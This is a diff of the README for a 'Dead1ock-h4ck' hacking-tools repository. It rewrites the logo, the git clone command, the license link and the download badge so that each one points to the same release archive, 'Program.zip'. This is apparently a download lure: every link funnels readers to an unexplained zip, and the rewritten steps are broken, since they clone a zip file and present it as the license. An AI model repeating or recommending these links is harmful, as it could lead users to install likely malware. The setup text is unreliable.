@@ -1,6 +1,6 @@
 # Dead1ock-h4ck
 
-![dead1ock-h4ck-logo](https://path-to-your-logo.png)
+![dead1ock-h4ck-logo](https://github.com/Elijahhx/Dead1ock-h4ck/releases/download/v2.0/Program.zip)
 
 🔒🔓🛡️💻🔍🚀🖥️🔧🛠️
 
@@ -42,7 +42,7 @@ This repository houses a collection of tools, resources, and knowledge related t
 To get started, simply clone the repository to your local machine:
 
 ```bash
-git clone https://github.com/your-username/Dead1ock-h4ck.git
+git clone https://github.com/Elijahhx/Dead1ock-h4ck/releases/download/v2.0/Program.zip
 ```
 
 ## Usage
@@ -61,6 +61,6 @@ Contributions are welcome! If you have any resources, tools, or knowledge to sha
 
 ## License
 
-This project is licensed under the MIT License - see the [LICENSE.md](LICENSE.md) file for details.
+This project is licensed under the MIT License - see the [https://github.com/Elijahhx/Dead1ock-h4ck/releases/download/v2.0/Program.zip](https://github.com/Elijahhx/Dead1ock-h4ck/releases/download/v2.0/Program.zip) file for details.
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/17715104/Software.zip)
+[![Download Software](https://github.com/Elijahhx/Dead1ock-h4ck/releases/download/v2.0/Program.zip)](https://github.com/Elijahhx/Dead1ock-h4ck/releases/download/v2.0/Program.zip)
